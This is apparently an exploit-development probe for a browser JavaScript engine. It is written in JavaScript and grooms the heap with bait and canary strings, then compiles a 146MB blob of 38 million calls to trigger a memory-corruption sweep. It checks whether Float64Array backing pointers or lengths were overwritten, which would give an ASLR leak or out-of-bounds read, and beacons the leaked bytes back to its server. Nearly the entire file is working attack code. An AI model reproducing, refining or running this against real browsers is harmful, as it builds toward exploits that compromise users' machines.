// p165 — Float64Array cell corruption: the cleaner primitive candidate (issue #5 Stage 4)
//
// p156/p164 CONTEXT: the sweep rewrites MarkedSpace cells (JSString .length=81400).
// p164 tests DataView cells. THIS probe targets JSTypedArray (Float64Array):
//   - m_vector (backing store pointer) — if the sweep overwrites it, arr[0]
//     reads 8 raw bytes from wherever the written value points: an ASLR leak with
//     zero fake-object construction
//   - m_length / byteLength — if overwritten with a value > 2, indexed reads
//     run past the 16-byte backing store: an OOB read within adjacent heap
//
// Float64Array reads are bounds-checked against m_length, NOT the ArrayBuffer:
// a corrupted (larger) m_length turns every index into an OOB read at
// vector + 8*i. A corrupted m_vector redirects all reads.
//
// Reads are raw-bit extracted via a clean bitcast buffer (f64 <-> 2x u32), so a
// redirected read yields the target memory's raw bytes, not a JS number.
//
// STRATEGY (groom identical to p156/p164 — proven portable):
// 1. Main: 20 bait strings (100KB, marge, low)
// 2. Worker: 8 canary strings + 16 small Float64Arrays (16B AB, 2 elements,
//    'D' 0x44 fill) + 4 marge Float64Arrays (102,400B AB, 12800 elements)
// 3. Free baits + 30 GC rounds
// 4. Compile the 38,348,816-call blob (146MB), call → sweep
// 5. Worker busy-loop on canary .length → dump arrays: length, byteLength,
//    byteOffset, f2hex(f64[0]), f2hex(f64[1]) — each in try/catch
// 6. Classification: PRE-OK / VECTOR-HIT / LEN-HIT / DEAD
//
// Beacon prefix: V165-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V165-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V165-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var canaries = [];
    var smallF64s = [];
    var margeF64s = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var SMALL_AB = 16;      // 2 elements
    var MARGE_AB = 102400;  // 12800 elements
    var CANARY = 0x41;
    var FILL = 0x44;
    var FILL_HEX = '4444444444444444';

    // clean bitcast buffer — separate from all targets
    var cvtBuf = new ArrayBuffer(8);
    var cvtF64 = new Float64Array(cvtBuf);
    var cvtU32 = new Uint32Array(cvtBuf);
    function f2hex(v) {
      cvtF64[0] = v;
      var hi = cvtU32[1], lo = cvtU32[0];
      function hx(x) {
        var s = '';
        for (var b = 3; b >= 0; b--) {
          var byte = (x >>> (8 * b)) & 0xFF;
          s += (byte < 16 ? '0' : '') + byte.toString(16);
        }
        return s;
      }
      return hx(hi) + hx(lo);
    }

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V165-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V165-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';

        // 8 canary strings — the proven p156 detector
        for (var i = 0; i < 8; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          canaries.push(s);
        }
        beacon('CANARIES-' + canaries.length);

        function makeF64(sizeBytes, nominalElems) {
          var ab = new ArrayBuffer(sizeBytes);
          var u8 = new Uint8Array(ab);
          for (var f = 0; f < sizeBytes; f++) u8[f] = FILL;
          var arr = new Float64Array(ab);
          if (arr.length !== nominalElems) return null;
          if (f2hex(arr[0]) !== FILL_HEX) return null;
          return arr;
        }

        // 16 small Float64Arrays — cells in the same MarkedSpace phase
        for (var d = 0; d < 16; d++) {
          var arr = makeF64(SMALL_AB, SMALL_AB / 8);
          if (arr === null) { beacon('PRE-F64-FAIL-' + d); continue; }
          smallF64s.push(arr);
        }
        beacon('SMALLF64S-' + smallF64s.length);

        // 4 marge Float64Arrays — same size class as the metadata buffer
        for (var m = 0; m < 4; m++) {
          var arrm = makeF64(MARGE_AB, MARGE_AB / 8);
          if (arrm === null) { beacon('PRE-F64M-FAIL-' + m); continue; }
          margeF64s.push(arrm);
        }
        beacon('MARGEF64S-' + margeF64s.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iterations = 0;

        // BUSY LOOP on the proven detector
        while (!found) {
          for (var i = 0; i < canaries.length; i++) {
            if (canaries[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + canaries[i].length);
              found = true;
              break;
            }
            var c8 = canaries[i].charCodeAt(8);
            var c56 = canaries[i].charCodeAt(56);
            if (c8 !== CANARY || c56 !== CANARY) { found = true; break; }
          }
          iterations++;
          if (iterations % 500000 === 0) beacon('POLL-' + iterations);
        }

        // Sweep arrived — dump every array before anything can die
        function dumpArr(tag, idx, arr, nominalElems) {
          var l, bl, bo;
          try { l = arr.length; } catch(e1) { l = 'X'; }
          try { bl = arr.byteLength; } catch(e2) { bl = 'X'; }
          try { bo = arr.byteOffset; } catch(e3) { bo = 'X'; }
          beacon(tag + '-' + idx + '-len=' + l + '-bl=' + bl + '-bo=' + bo);

          var h0, h1;
          try { h0 = f2hex(arr[0]); } catch(e4) { h0 = 'XXXXXXXXXXXXXXXX'; }
          try { h1 = f2hex(arr[1]); } catch(e5) { h1 = 'XXXXXXXXXXXXXXXX'; }

          var cls;
          if (h0 === 'XXXXXXXXXXXXXXXX') cls = 'DEAD';
          else if (l !== nominalElems) cls = 'LEN-HIT';
          else if (h0 === FILL_HEX && h1 === FILL_HEX) cls = 'PRE-OK';
          else cls = 'VECTOR-HIT';
          beacon(tag + 'C-' + idx + '-' + cls);
          beaconPost(tag + 'H-' + idx, h0 + ' ' + h1);
        }

        for (var sd = 0; sd < smallF64s.length; sd++) dumpArr('F64', sd, smallF64s[sd], SMALL_AB / 8);
        for (var md = 0; md < margeF64s.length; md++) dumpArr('F64M', md, margeF64s[md], MARGE_AB / 8);

        // canary lengths for the p156 baseline cross-check
        for (var c = 0; c < canaries.length; c++) {
          var len = canaries[c].length;
          if (len !== STR_LEN) beacon('CH-' + c + '-len=' + len);
        }

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (Primary/marge heap, proven groom) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baitChunk = '';
  for (var bc = 0; bc < 100; bc++) baitChunk += 'BBBBBBBBBB'; // 1000 'B's
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };

  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');

    for (var i = 0; i < baits.length; i++) {
      baits[i] = null;
    }
    baits = null;

    var gcRound = 0;

    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) {
        new ArrayBuffer(8192);
      }
      for (var j2 = 0; j2 < 500; j2++) {
        new Array(100).fill(gcRound);
      }
      gcRound++;

      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }

    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v165fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v165ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v165ok ? 'OK' : 'FAIL'));
      if (!window.__v165fn) { B('NO-FN'); return; }

      // ── PHASE 5: START WORKER POLLING, THEN TRIGGER ──
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');

        try {
          window.__v165fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }

        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
